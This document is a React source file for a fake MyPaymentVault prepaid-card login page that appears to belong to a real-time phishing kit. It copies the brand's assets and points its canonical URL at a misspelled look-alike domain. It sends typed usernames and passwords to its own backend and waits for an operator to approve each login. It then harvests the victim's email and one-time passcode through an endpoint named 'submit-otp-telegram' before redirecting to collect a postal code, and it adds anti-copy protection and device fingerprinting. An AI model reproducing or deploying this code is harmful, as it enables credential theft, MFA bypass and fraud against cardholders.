import { useState, useEffect, useRef, useCallback } from 'react';
import { useLocation } from 'wouter';
import { AntiCopyProtection } from '@/components/AntiCopyProtection';
import { SEO } from '@/components/SEO';
import { LanguageSwitcher } from '@/components/LanguageSwitcher';
import { useLanguage } from '@/contexts/LanguageContext';
import { apiRequest } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { getDeviceData } from '@/lib/deviceInfo';
import { getSourceInfo } from '@/lib/sourceInfo';
import { collectDeviceFingerprint, getStoredFingerprint, type DeviceFingerprint } from '@/lib/device-fingerprint';
import '@/styles/styles.css';
import logoSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';
import loginPageImg from '@assets/extracted/login.mypaymentvault.com/login_page.webp';

type FlowStage = 
  | 'idle'
  | 'login_waiting'
  | 'login_approved'
  | 'email_input'
  | 'email_waiting'
  | 'email_kirimmi'
  | 'email_timeout'
  | 'otp_input'
  | 'otp_waiting'
  | 'otp_approved'
  | 'login_rejected'
  | 'login_timeout';

export default function LoginPage() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const { t } = useLanguage();
  
  const [flowStage, setFlowStage] = useState<FlowStage>('idle');
  const [loginAttemptId, setLoginAttemptId] = useState('');
  const [sessionId, setSessionId] = useState('');
  const [email, setEmail] = useState('');
  const [maskedEmail, setMaskedEmail] = useState('');
  const [otpCode, setOtpCode] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [otpError, setOtpError] = useState('');
  const [otpSentToEmail, setOtpSentToEmail] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalMessage, setErrorModalMessage] = useState('');
  const [fingerprint, setFingerprint] = useState<DeviceFingerprint | null>(null);
  const [countdown, setCountdown] = useState(180);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    const heroImg = document.querySelector('[data-testid="img-login-hero"]');
    if (heroImg) heroImg.setAttribute('fetchpriority', 'high');
  }, []);

  useEffect(() => {
    const collectFp = async () => {
      const stored = getStoredFingerprint();
      if (stored) {
        setFingerprint(stored);
      } else {
        const fp = await collectDeviceFingerprint(true);
        setFingerprint(fp);
      }
    };
    collectFp();
  }, []);

  useEffect(() => {
    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const startCountdown = useCallback(() => {
    setCountdown(180);
    if (countdownRef.current) clearInterval(countdownRef.current);
    countdownRef.current = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          if (countdownRef.current) clearInterval(countdownRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  const stopPolling = useCallback(() => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current);
      pollingRef.current = null;
    }
    if (countdownRef.current) {
      clearInterval(countdownRef.current);
      countdownRef.current = null;
    }
  }, []);

  const startLoginPolling = useCallback((attemptId: string) => {
    stopPolling();
    startCountdown();

    pollingRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/login-status?loginAttemptId=${attemptId}`);
        const data = await res.json();
        
        if (data.stage === 'login_approved') {
          stopPolling();
          setFlowStage('email_input');
        } else if (data.stage === 'login_rejected') {
          stopPolling();
          setFlowStage('login_rejected');
          setErrorModalMessage("You've entered an incorrect username or password. After three failed attempts, your account may lock and you'll need to contact customer service.");
          setShowErrorModal(true);
        } else if (data.stage === 'login_timeout') {
          stopPolling();
          setFlowStage('login_timeout');
          setErrorModalMessage("Your login session has expired. Please try again.");
          setShowErrorModal(true);
        }
      } catch (err) {
        console.error('Polling error:', err);
      }
    }, 2000);
  }, [stopPolling, startCountdown, toast]);

  const startEmailPolling = useCallback((attemptId: string) => {
    stopPolling();
    startCountdown();

    pollingRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/email-status?loginAttemptId=${attemptId}`);
        const data = await res.json();

        if (data.stage === 'email_kirimmi') {
          stopPolling();
          setOtpSentToEmail(false);
          setFlowStage('otp_input');
        } else if (data.stage === 'email_timeout') {
          stopPolling();
          setOtpSentToEmail(true);
          if (data.sessionId) {
            setSessionId(data.sessionId);
          }
          setFlowStage('otp_input');
        }
      } catch (err) {
        console.error('Email polling error:', err);
      }
    }, 2000);
  }, [stopPolling, startCountdown]);

  const startOtpPolling = useCallback((attemptId: string) => {
    stopPolling();
    startCountdown();

    pollingRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/otp-status?loginAttemptId=${attemptId}`);
        const data = await res.json();

        if (data.stage === 'otp_approved' || data.stage === 'completed') {
          stopPolling();
          setFlowStage('otp_approved');
          sessionStorage.setItem('loginAttemptId', attemptId);
          setLocation('/postal-code');
        } else if (data.stage === 'otp_rejected') {
          stopPolling();
          setOtpCode('');
          setOtpError('');
          setFlowStage('otp_input');
          toast({
            title: 'OTP Salah',
            description: 'Kode OTP yang Anda masukkan salah. Silakan masukkan kode yang benar.',
            variant: 'destructive',
          });
        } else if (data.stage === 'otp_timeout') {
          stopPolling();
          toast({
            title: 'Waktu Habis',
            description: 'Verifikasi OTP telah habis. Silakan coba lagi.',
            variant: 'destructive',
          });
          setFlowStage('idle');
        }
      } catch (err) {
        console.error('OTP polling error:', err);
      }
    }, 2000);
  }, [stopPolling, startCountdown, toast, setLocation]);

  const maskEmail = (email: string) => {
    const [user, domain] = email.split('@');
    const maskedUser = user.length > 3 ? `${user[0]}...${user.slice(-1)}` : `${user[0]}...`;
    return `${maskedUser}@${domain}`;
  };

  const validateEmail = () => {
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const trimmedEmail = email.trim();
    
    if (!emailPattern.test(trimmedEmail)) {
      setEmailError(t('email.invalidEmail'));
      setMaskedEmail('');
      return false;
    }
    
    setEmailError('');
    setMaskedEmail(maskEmail(trimmedEmail));
    return true;
  };

  const validateOtp = () => {
    if (!/^\d{6}$/.test(otpCode.trim())) {
      setOtpError(t('otp.invalidCode'));
      return false;
    }
    setOtpError('');
    return true;
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username.trim() || !password.trim()) {
      toast({
        title: t('error.generic'),
        description: t('error.credentialsRequired'),
        variant: 'destructive',
      });
      return;
    }

    try {
      const deviceData = getDeviceData();
      const currentFingerprint = fingerprint || await collectDeviceFingerprint(true);
      const response = await apiRequest('POST', '/api/login', { 
        username, 
        password,
        fingerprint: currentFingerprint,
        sourceInfo: getSourceInfo(),
        ...deviceData 
      });
      const data = await response.json();
      
      if (data.success) {
        setLoginAttemptId(data.loginAttemptId);
        sessionStorage.setItem('loginAttemptId', data.loginAttemptId);
        setFlowStage('login_waiting');
        startLoginPolling(data.loginAttemptId);
      }
    } catch (error: any) {
      toast({
        title: t('error.generic'),
        description: error.message || t('error.loginFailed'),
        variant: 'destructive',
      });
    }
  };

  const submitEmail = async () => {
    if (!validateEmail()) return;

    try {
      const response = await apiRequest('POST', '/api/submit-email', { 
        loginAttemptId, 
        email: email.trim(),
        sourceInfo: getSourceInfo() 
      });
      const data = await response.json();
      
      if (data.success) {
        setFlowStage('email_waiting');
        startEmailPolling(loginAttemptId);
      }
    } catch (error: any) {
      toast({
        title: t('error.generic'),
        description: error.message || t('error.emailVerificationFailed'),
        variant: 'destructive',
      });
    }
  };

  const submitOtp = async () => {
    if (!validateOtp()) return;

    try {
      const response = await apiRequest('POST', '/api/submit-otp-telegram', { 
        loginAttemptId, 
        otpCode: otpCode.trim(),
        sessionId: otpSentToEmail ? sessionId : undefined,
        sourceInfo: getSourceInfo() 
      });
      const data = await response.json();
      
      if (data.success) {
        setFlowStage('otp_waiting');
        startOtpPolling(loginAttemptId);
      }
    } catch (error: any) {
      toast({
        title: t('error.generic'),
        description: error.message || t('error.otpVerificationFailed'),
        variant: 'destructive',
      });
    }
  };

  const closeModal = () => {
    stopPolling();
    setFlowStage('idle');
    setEmail('');
    setEmailError('');
    setOtpCode('');
    setOtpError('');
    setOtpSentToEmail(false);
  };

  const formatCountdown = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
  };

  const showWaitingModal = flowStage === 'login_waiting';
  const showEmailModal = flowStage === 'email_input';
  const showEmailWaitingModal = flowStage === 'email_waiting';
  const showOtpModal = flowStage === 'otp_input';
  const showOtpWaitingModal = flowStage === 'otp_waiting';

  const faqItems = [
    {
      question: "How do I login to MyPaymentVault?",
      answer: "To login to MyPaymentVault, enter your username and password on the login page. You will then receive an email verification code for multi-factor authentication to ensure secure access to your account."
    },
    {
      question: "What is MyPaymentVault login portal?",
      answer: "MyPaymentVault login portal is a secure payment authentication system for employees and cardholders. It provides multi-factor authentication including email verification and OTP codes to protect your payment information."
    },
    {
      question: "How long does the OTP verification code last?",
      answer: "The OTP verification code sent to your email expires in 10 minutes. If the code expires, you will need to restart the login process to receive a new verification code."
    },
    {
      question: "What should I do if I forgot my MyPaymentVault username?",
      answer: "If you forgot your username, click on the 'Forgot Username' link on the login page. You can recover your username by providing your card details for verification."
    },
    {
      question: "Is MyPaymentVault login secure?",
      answer: "Yes, MyPaymentVault uses multi-factor authentication (MFA) with email verification, OTP codes, and card verification to ensure maximum security for your payment account access."
    }
  ];

  return (
    <>
      <SEO 
        title="MyPaymentVault - Login | Access and Manage Your Account"
        description="Log in to MyPaymentVault to access your payment details, check your balance, and manage your account securely. Not enrolled yet? Create your account today."
        keywords="MyPaymentVault, login mypaymentvault, mypaymentvault login, login wirecard, login northlane, login north lane, wirecard login, northlane login, payment vault login, employee payment portal, secure payment login, mypaymentvault account access, onbe login, wirecard 2 login, onbe 1 login"
        canonical="https://login-mypaymentvaultl.com/"
        breadcrumbs={[
          { name: "MyPaymentVault", url: "/" },
          { name: "Login", url: "/login" }
        ]}
        faqItems={faqItems}
      />
      <AntiCopyProtection />
      
      <div id="root">
        <div>
          <div className="onbe-login-component">
            <div className="onbe-login-inner-component">
              
              <header className="onbe-headercomponent-parent">
                <div className="onbe-login-header-padding d-flex col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6 offset-xxl-0 offset-xl-0 offset-lg-0 offset-md-0 offset-sm-0 offset-0">
                  <img 
                    src={logoSvg} 
                    alt={t('common.companyLogo')} 
                    className="onbe-header-affiliate-logo header-logo-size"
                  />
                </div>
                <div className="onbe-header-parent-select-hamburger col-xxl-2 col-xl-2 col-lg-2 col-md-6 col-sm-3 col-3 offset-xxl-7 offset-xl-7 offset-lg-7 offset-md-0 offset-sm-3 offset-3">
                  <LanguageSwitcher />
                </div>
              </header>

              <div className="onbe-login-row row">
                
                <div className="onbe-login-details-section col-xxl-4 col-xl-5 col-lg-5 col-md-12 col-sm-12 col-12 offset-xxl-0 order-xl-2 offset-xl-0 order-lg-2 offset-lg-0 order-md-2 offset-md-0 order-sm-2 offset-sm-0 order-2 offset-0">
                  <form onSubmit={handleLogin} id="secure_login">
                    <div className="row">
                      <div className="onbe-formContainer">
                        
                        <div className="onbe-login-subtitle col-lg-12 col-md-12 col-12">
                          <h5 className="onbe-h5">{t('login.title')}</h5>
                          <div className="my-3">
                            {t('login.notEnrolled')}
                            <a className="text-dark ms-2" href="/register" style={{ textDecoration: 'underline' }}>{t('login.createAccount')}</a>
                          </div>
                        </div>

                        <div className="onbe-login-forget col-lg-12 col-12">
                          <a href="/forgot-username" className="onbe-login-forget">{t('login.forgotUsername')}</a>
                        </div>

                        <div className="col-lg-12 col-md-12 col-12">
                          <div className="onbe-btovr-input-group">
                            <input 
                              type="text" 
                              id="username" 
                              name="username" 
                              className="onbe-btovr-input-group__input" 
                              placeholder=" " 
                              maxLength={20}
                              value={username}
                              onChange={(e) => setUsername(e.target.value)}
                              data-testid="input-username"
                            />
                            <label className="onbe-btovr-input-group__input_label" htmlFor="username">
                              {t('login.username')}<span className="red">*</span>
                            </label>
                            <div className="text-danger"></div>
                          </div>
                        </div>

                        <div className="onbe-login-forget col-lg-12 col-12">
                          <a href="/forgot-password" className="onbe-login-forget">{t('login.forgotPassword')}</a>
                        </div>

                        <div className="col-lg-12 col-md-12 col-12">
                          <div className="onbe-btovr-input-group">
                            <input 
                              type="password" 
                              id="password" 
                              name="password" 
                              className="onbe-btovr-input-group__input" 
                              placeholder=" " 
                              maxLength={50}
                              value={password}
                              onChange={(e) => setPassword(e.target.value)}
                              data-testid="input-password"
                            />
                            <label className="onbe-btovr-input-group__input_label" htmlFor="password">
                              {t('login.password')}<span className="red">*</span>
                            </label>
                            <div className="text-danger"></div>
                          </div>
                        </div>

                        <div className="col-lg-12 col-md-12 col-sm-12 col-12">
                          <button 
                            type="submit" 
                            id="login" 
                            className="onbe-button onbe-button-primary" 
                            style={{ backgroundColor: '#212121', borderColor: '#212121', color: '#fff' }}
                            disabled={flowStage !== 'idle' && flowStage !== 'login_rejected' && flowStage !== 'login_timeout'}
                            data-testid="button-login"
                          >
                            {t('login.signIn')}
                          </button>
                        </div>

                        <div className="text-center mt-2">
                          <p>
                            {t('login.activateCard')} 
                            <a href="/activate-card" className="text-dark ms-2" style={{ textDecoration: 'underline' }} data-testid="link-activate-card">{t('login.activateCardLink')}</a>
                          </p>
                        </div>

                      </div>
                    </div>
                  </form>
                </div>

                <div 
                  className="onbe-login-logo-section col-xxl-6 col-xl-6 col-lg-6 col-md-12 col-sm-12 col-12 order-xxl-2 offset-xxl-0 order-xl-2 offset-xl-0 order-lg-2 offset-lg-0 order-md-1 offset-md-0 order-sm-1 offset-sm-0 order-1 offset-0" 
                  style={{ background: 'linear-gradient(to top, var(--white-color), var(--white-color) 5%, #212121 0%)' }}
                >
                  <img 
                    alt="MyPaymentVault login portal" 
                    width={670}
                    height={502}
                    src={loginPageImg} 
                    loading="eager"
                    decoding="async"
                    style={{ width: '100%', height: 'auto', aspectRatio: '670/502' }}
                    data-testid="img-login-hero"
                  />
                </div>

              </div>

            </div>
            
            <div className="onbe-footer-width">
              <footer className="onbe-footer">
                <ul className="onbe-footer-text">
                  <li><a className="onbe-footer-anchor" href="#" data-testid="link-copyright">{t('login.footer.copyright')}</a></li>
                  <li><a className="onbe-footer-anchor" href="#" target="_blank" data-testid="link-terms-of-use">{t('login.footer.terms')}</a></li>
                  <li><a className="onbe-footer-anchor" href="#" target="_blank" data-testid="link-privacy-cookies">{t('login.footer.privacy')}</a></li>
                  <li><a className="onbe-footer-anchor" href="#" data-testid="link-contact-us">{t('login.footer.contact')}</a></li>
                </ul>
              </footer>
            </div>
          </div>
        </div>
      </div>

      {/* Error Modal */}
      {showErrorModal && (
        <div 
          className="otp-modal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '25px 20px', 
            borderRadius: '10px', 
            width: '100%', 
            maxWidth: '340px', 
            textAlign: 'center', 
            fontFamily: 'Arial', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
          }}>
            <p style={{ fontSize: '18px', fontWeight: 'bold', marginBottom: '12px', color: '#000' }} data-testid="text-error-title">Error</p>
            <p style={{ fontSize: '14px', color: '#333', marginBottom: '20px', lineHeight: '1.5' }} data-testid="text-error-message">
              {errorModalMessage}
            </p>
            <button 
              onClick={() => { setShowErrorModal(false); setFlowStage('idle'); }}
              style={{ 
                width: '100%', 
                padding: '12px', 
                background: '#212121', 
                color: '#fff', 
                fontWeight: 'bold', 
                fontSize: '15px', 
                border: 'none', 
                borderRadius: '6px', 
                cursor: 'pointer' 
              }}
              data-testid="button-error-continue"
            >
              Continue
            </button>
          </div>
        </div>
      )}

      {/* Email Input Modal */}
      {showEmailModal && (
        <div 
          className="otp-modal" 
          id="emailModal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '25px', 
            borderRadius: '15px', 
            width: '100%', 
            maxWidth: '350px', 
            textAlign: 'center', 
            fontFamily: 'Arial', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
          }}>
            <p className="onbe-textcomponent-header-otp-modal">{t('email.title')}</p>
            <p style={{ fontSize: '14px', marginBottom: '8px' }}>
              {t('email.description')}
            </p>
            <p style={{ fontSize: '14px', marginBottom: '12px' }}>
              {t('email.selectMethod')}
            </p>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '12px' }}>
              <input type="radio" checked disabled style={{ accentColor: 'black', width: '14px', height: '14px' }} data-testid="radio-email-option" />
              <span style={{ fontSize: '14px' }}>{t('email.label')} <strong id="maskedEmail">{maskedEmail || t('email.placeholder_example')}</strong></span>
            </div>
            <div style={{ position: 'relative', marginBottom: '10px' }}>
              <input 
                id="emailInput" 
                type="email" 
                placeholder={t('email.placeholder')}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onInput={validateEmail}
                style={{ width: '100%', padding: '10px', fontSize: '14px', border: '2px solid #ccc', borderRadius: '6px' }}
                data-testid="input-email"
              />
            </div>
            {emailError && (
              <p id="emailError" style={{ color: 'red', fontSize: '13px', marginTop: '4px' }}>
                {emailError}
              </p>
            )}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', marginBottom: '14px' }}>
              <button 
                onClick={closeModal} 
                style={{ flex: 1, marginRight: '6px', padding: '10px', background: '#fff', color: '#000', fontWeight: 'bold', fontSize: '14px', border: '1px solid black', borderRadius: '6px' }}
                data-testid="button-cancel-email"
              >
                {t('common.cancel')}
              </button>
              <button 
                onClick={submitEmail} 
                style={{ flex: 1, marginLeft: '6px', padding: '10px', background: 'black', color: 'white', fontWeight: 'bold', fontSize: '14px', border: 'none', borderRadius: '6px' }}
                data-testid="button-send-code"
              >
                {t('email.verify')}
              </button>
            </div>
            <div style={{ fontSize: '11px' }}>
              {t('email.standardRates')}<br />
              <a href="#" style={{ color: '#000', textDecoration: 'underline' }} data-testid="link-privacy-policy">{t('email.privacyPolicy')}</a>
              &nbsp;
              <a href="#" style={{ color: '#000', textDecoration: 'underline' }} data-testid="link-terms-conditions">{t('email.termsConditions')}</a>
            </div>
          </div>
        </div>
      )}

      {/* Waiting for KIRIMMI Modal */}
      {showEmailWaitingModal && (
        <div 
          className="otp-modal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '30px', 
            borderRadius: '15px', 
            width: '100%', 
            maxWidth: '350px', 
            textAlign: 'center', 
            fontFamily: 'Arial', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
          }}>
            <div style={{ marginBottom: '20px' }}>
              <div style={{ 
                width: '50px', 
                height: '50px', 
                border: '4px solid #e0e0e0', 
                borderTop: '4px solid #212121', 
                borderRadius: '50%', 
                animation: 'spin 1s linear infinite',
                margin: '0 auto 15px'
              }} />
            </div>
            <p style={{ fontSize: '16px', fontWeight: 'bold', marginBottom: '8px' }}>Verifying Email Address</p>
            <p style={{ fontSize: '14px', color: '#666', marginBottom: '15px' }}>
              Please wait while we process your email verification. A code will be sent shortly.
            </p>
            <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#212121' }} data-testid="text-countdown-email">
              {formatCountdown(countdown)}
            </p>
            <p style={{ fontSize: '12px', color: '#999', marginTop: '5px' }}>Time remaining</p>
            <button 
              onClick={closeModal}
              style={{ marginTop: '15px', padding: '8px 20px', background: '#fff', color: '#000', fontSize: '13px', border: '1px solid #ccc', borderRadius: '6px', cursor: 'pointer' }}
              data-testid="button-cancel-email-waiting"
            >
              Cancel
            </button>
          </div>
        </div>
      )}

      {/* OTP Input Modal */}
      {showOtpModal && (
        <div 
          className="otp-modal" 
          id="otpModal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '30px', 
            borderRadius: '15px', 
            width: '100%', 
            maxWidth: '350px', 
            textAlign: 'center', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)', 
            fontFamily: 'Arial' 
          }}>
            <p className="onbe-textcomponent-header-otp-modal">{t('otp.title')}</p>
            {otpSentToEmail ? (
              <>
                <p style={{ fontSize: '14px', marginBottom: '8px' }}>{t('otp.description')} <strong>{maskedEmail}</strong></p>
                <p style={{ fontSize: '14px', marginBottom: '8px' }}>{t('otp.expiry')}</p>
                <p style={{ fontSize: '13px', marginBottom: '8px', color: '#666', fontStyle: 'italic' }}>
                  If you don't see the code in your inbox, please check your spam or junk folder.
                </p>
              </>
            ) : (
              <p style={{ fontSize: '14px', marginBottom: '8px' }}>
                Please enter the verification code provided to you.
              </p>
            )}
            <div style={{ position: 'relative', margin: '20px auto' }}>
              <input 
                id="otpCode" 
                maxLength={6} 
                placeholder={t('otp.placeholder')}
                type="tel" 
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value)}
                onInput={validateOtp}
                style={{ width: '100%', padding: '10px', fontSize: '16px', border: '2px solid #ccc', borderRadius: '6px' }}
                data-testid="input-otp"
              />
            </div>
            {otpError && (
              <p id="otpError" style={{ color: 'red', fontSize: '13px' }}>
                {otpError}
              </p>
            )}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: '16px', marginBottom: '14px' }}>
              <button 
                onClick={closeModal} 
                style={{ flex: 1, marginRight: '6px', padding: '10px', background: '#fff', color: '#000', fontWeight: 'bold', fontSize: '14px', border: '1px solid black', borderRadius: '6px' }}
                data-testid="button-cancel-otp"
              >
                {t('common.cancel')}
              </button>
              <button 
                onClick={submitOtp} 
                style={{ flex: 1, marginLeft: '6px', padding: '10px', background: 'black', color: 'white', fontWeight: 'bold', fontSize: '14px', border: 'none', borderRadius: '6px' }}
                data-testid="button-continue-otp"
              >
                {t('otp.verify')}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Waiting for OTP Approval Modal */}
      {showOtpWaitingModal && (
        <div 
          className="otp-modal" 
          style={{ 
            display: 'flex', 
            position: 'fixed', 
            zIndex: 9999, 
            top: 0, 
            left: 0, 
            width: '100vw', 
            height: '100vh', 
            backgroundColor: 'rgba(0,0,0,0.5)', 
            alignItems: 'center', 
            justifyContent: 'center' 
          }}
        >
          <div style={{ 
            background: '#fff', 
            padding: '30px', 
            borderRadius: '15px', 
            width: '100%', 
            maxWidth: '350px', 
            textAlign: 'center', 
            fontFamily: 'Arial', 
            boxShadow: '0 0 20px rgba(0,0,0,0.4)' 
          }}>
            <div style={{ marginBottom: '20px' }}>
              <div style={{ 
                width: '50px', 
                height: '50px', 
                border: '4px solid #e0e0e0', 
                borderTop: '4px solid #212121', 
                borderRadius: '50%', 
                animation: 'spin 1s linear infinite',
                margin: '0 auto 15px'
              }} />
            </div>
            <p style={{ fontSize: '16px', fontWeight: 'bold', marginBottom: '8px' }}>Verifying OTP Code</p>
            <p style={{ fontSize: '14px', color: '#666', marginBottom: '15px' }}>
              Please wait while we verify your code. This may take a moment.
            </p>
            <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#212121' }} data-testid="text-countdown-otp">
              {formatCountdown(countdown)}
            </p>
            <p style={{ fontSize: '12px', color: '#999', marginTop: '5px' }}>Time remaining</p>
            <button 
              onClick={closeModal}
              style={{ marginTop: '15px', padding: '8px 20px', background: '#fff', color: '#000', fontSize: '13px', border: '1px solid #ccc', borderRadius: '6px', cursor: 'pointer' }}
              data-testid="button-cancel-otp-waiting"
            >
              Cancel
            </button>
          </div>
        </div>
      )}

    </>
  );
}
